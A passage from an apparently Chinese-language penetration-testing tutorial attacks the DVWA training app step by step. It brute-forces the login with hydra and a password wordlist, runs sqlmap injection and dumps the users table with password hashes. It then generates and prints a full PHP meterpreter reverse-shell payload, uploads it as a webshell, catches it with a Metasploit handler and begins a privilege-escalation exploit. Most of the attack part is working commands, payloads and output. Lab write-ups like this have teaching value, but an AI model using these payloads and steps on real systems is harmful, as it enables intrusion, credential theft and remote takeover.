</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">dahouzi110
</span></span><span class="line"><span class="cl">123.789+
</span></span><span class="line"><span class="cl">trista188#**
</span></span><span class="line"><span class="cl">mm1237
</span></span><span class="line"><span class="cl">07736056123
</span></span><span class="line"><span class="cl">TnHoo15862380404
</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">189532210113
</span></span><span class="line"><span class="cl">idc123
</span></span><span class="line"><span class="cl">gedingfeng1102888
</span></span></code></pre></td></tr></table>
</div>
</div><p>以及你需要把上面抓到的<code>username=admin&amp;password=6666666666&amp;Login=Login</code>和<code>Login failed</code>整合一下变成这样:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed
</span></span></code></pre></td></tr></table>
</div>
</div><p>整合一下，需要执行的指令就是下面这个了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hydra -l admin -P ./密码字典/pass-wake.txt -V -e ns 192.168.0.4 http-post-form <span class="s2">&#34;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>它很快就会给你破解出来</p>
<p></p>
<p></p>
<p>由上图可看出，密码就是<code>password</code></p>
<p>接下来我们尝试登录</p>
<p></p>
<p>如果成功登录，出现了这个页面，那么恭喜你，第一关完美通过
</p>
<h3 id="第二关简单sql注入">第二关|简单SQL注入</h3>
<p>第一关过了以后，我们要看看它的数据库里面有什么</p>
<h4 id="抓包-1">抓包</h4>
<p>我们回到他这个网页，先进入<code>DVWA Security</code>，把安全等级改成<code>Low</code></p>
<p></p>
<p>再点击<code>SQL Injection</code>这个按钮，进入这个页面。</p>
<p></p>
<p>接下来打开burp，按照之前的操作一样，监听，抓包什么的（这里我上面写得很详细了）</p>
<p>在burpsuite的监听下，在这个输入框里随便输入一些内容，然后点击这个<code>Submit</code>按钮，Burp就会自动抓包了</p>
<p></p>
<p>将它保存为一个txt文件，但是要记住它的位置，比如我的是<code>~/get.txt</code></p>
<p></p>
<p>这样抓包工作就完成了。</p>
<h4 id="使用sqlmap注入">使用sqlmap注入</h4>
<p>接下来用到的工具就是sqlmap了，这里只写出注入的流程，具体的教程请参考由帝的视频</p>
<p>我们先扫描一下注入点</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -r <span class="s2">&#34;get.txt&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p></p>
<p>这里均选<code>y</code>即可。</p>
<p></p>
<p>最后一个选项选<code>n</code>不必浪费时间了。</p>
<p></p>
<p>接下来我们就获得我们需要的信息了，数据库版本什么的。我把它贴出来吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Parameter: id (GET)
</span></span><span class="line"><span class="cl">    Type: boolean-based blind
</span></span><span class="line"><span class="cl">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; OR NOT 1144=1144#&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: error-based
</span></span><span class="line"><span class="cl">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; OR ROW(6268,9799)&gt;(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(6268=6268,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM (SELECT 9569 UNION SELECT 7660 UNION SELECT 7717 UNION SELECT 8645)a GROUP BY x)-- dPXL&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: time-based blind
</span></span><span class="line"><span class="cl">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; AND (SELECT 4811 FROM (SELECT(SLEEP(5)))hDuM)-- SMOw&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: UNION query
</span></span><span class="line"><span class="cl">    Title: MySQL UNION query (NULL) - 2 columns
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; UNION ALL SELECT NULL,CONCAT(0x7162786b71,0x794f4b67535851624375466379624550476a6243584e4b754d7250524e524d7a6c70587370704877,0x716a767071)#&amp;Submit=Submit
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">[13:19:30] [INFO] the back-end DBMS is MySQL
</span></span><span class="line"><span class="cl">back-end DBMS: MySQL &gt;= 4.1
</span></span><span class="line"><span class="cl">[13:19:30] [INFO] fetched data logged to text files under &#39;/home/weepingdogel/.sqlmap/output/192.168.0.105&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们就要查看数据库里面的内容了，由于原因，我就不贴出逐级查看的代码了，我直接dump</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -r <span class="s2">&#34;~/get.txt&#34;</span> --dump
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>出来了。</p>
<p>如果你终端里获取到了以下信息，那么说明，第二关通过了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Database: dvwa
</span></span><span class="line"><span class="cl">Table: users
</span></span><span class="line"><span class="cl">[5 entries]
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span><span class="line"><span class="cl">| user_id | user    | avatar                                                | password                                    | last_name | first_name |
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span><span class="line"><span class="cl">| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
</span></span><span class="line"><span class="cl">| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
</span></span><span class="line"><span class="cl">| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
</span></span><span class="line"><span class="cl">| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
</span></span><span class="line"><span class="cl">| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="第三关操作系统渗透">第三关|操作系统渗透</h3>
<p>Well,</p>
<p>接下来我们就要进行最关键的一环了，我们将使用Webshell的方式入侵靶机的操作系统。</p>
<p>知道PHP吗？我对它了解也不是很多，总之它可以被上传到服务器然后以可执行文件的方式运行。</p>
<p>这次也将使用PHP文件作为<strong>木马</strong>进行攻击。</p>
<h4 id="生成木马">生成木马</h4>
<p>我们用 <strong><code>msfvenom</code></strong> 这个命令来生成。执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.106 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o test.php
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>这样就生成好了。来看看里面有什么？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="cm">/*&lt;?php /**/</span> <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.106&#39;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;stream_socket_client&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="s2">&#34;tcp://</span><span class="si">{</span><span class="nv">$ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nv">$port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;fsockopen&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;socket_create&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nx">AF_INET</span><span class="p">,</span> <span class="nx">SOCK_STREAM</span><span class="p">,</span> <span class="nx">SOL_TCP</span><span class="p">);</span> <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nx">socket_connect</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;socket&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket funcs&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$a</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s2">&#34;Nlen&#34;</span><span class="p">,</span> <span class="nv">$len</span><span class="p">);</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;len&#39;</span><span class="p">];</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s_type</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;suhosin&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;suhosin.executor.disable_eval&#39;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$suhosin_bypass</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span> <span class="nv">$suhosin_bypass</span><span class="p">();</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> <span class="p">}</span> <span class="k">die</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>只有一行～！这一行就是嘿嘿。。。自己看啦</p>
<p>我们加一些html上去吧:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="cm">/*&lt;?php /**/</span> <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.106&#39;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;stream_socket_client&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="s2">&#34;tcp://</span><span class="si">{</span><span class="nv">$ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nv">$port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;fsockopen&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;socket_create&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nx">AF_INET</span><span class="p">,</span> <span class="nx">SOCK_STREAM</span><span class="p">,</span> <span class="nx">SOL_TCP</span><span class="p">);</span> <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nx">socket_connect</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;socket&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket funcs&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$a</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s2">&#34;Nlen&#34;</span><span class="p">,</span> <span class="nv">$len</span><span class="p">);</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;len&#39;</span><span class="p">];</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s_type</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;suhosin&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;suhosin.executor.disable_eval&#39;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$suhosin_bypass</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span> <span class="nv">$suhosin_bypass</span><span class="p">();</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> <span class="p">}</span> <span class="k">die</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;meta charset=&#34;utf-8&#34; /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;h1&gt;Hacked&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>接下来回到DVWA，在左下角点击 <strong><code>upload</code></strong> 进入上传页面，然后点击 <strong><code>选择文件</code></strong> 再点击 <strong><code>upload</code></strong> 即可。</p>
<p>将这个文件上传进去。</p>
<p>如果这都不会我就不多说了，<strong>你连上传个文件都不会还想进锏幕？</strong></p>
<p></p>
<p>然后我们可以看到这么一串东西。</p>
<p><strong><code>../../hackable/uploads/test.php succesfully uploaded!</code></strong></p>
<p>说明你上传成功了，接下来要用到<strong>msf</strong></p>
<p>我们在终端进入msf:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>不多讲了，走个命令流程，之前写过</p>
<p>调用模块:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler
</span></span></code></pre></td></tr></table>
</div>
</div><p>按顺序执行:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lhost 192.168.0.106
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">4444</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload php/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行完后，如图:</p>
<p></p>
<p>接下来，我们会到浏览器，直接访问<code>http://192.168.0.105/dvwa/hackable/uploads/test.php</code></p>
<p>这时，msf会收到反弹，如图:</p>
<p></p>
<p></p>
<p>可见权限小得可怜，不过也第三关就这样通过了。权限的问题我们会在第四关解决</p>
<h3 id="第四关获取root权限">第四关|获取root权限</h3>
<p>你能做到这里说明你已经不是萌新了，最后一关：提权</p>
<p>这是最关键的一环，那么我们开始吧。</p>
<p>首先把我们刚刚获取的webshell放到后台:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; background
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后我们使用这个模块<code>exploit/linux/local/udev_netlink</code>(用别的也可以，我个人喜欢用这个:)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; use exploit/linux/local/udev_netlink
</span></span></code></pre></td></tr></table>
</div>
</div><p>模块的信息你可以自己输入 <strong><code>info</code></strong> 这个命令去查看，</p>
<p>然后我们设置刚刚webshell的session号，我的是2:</p>
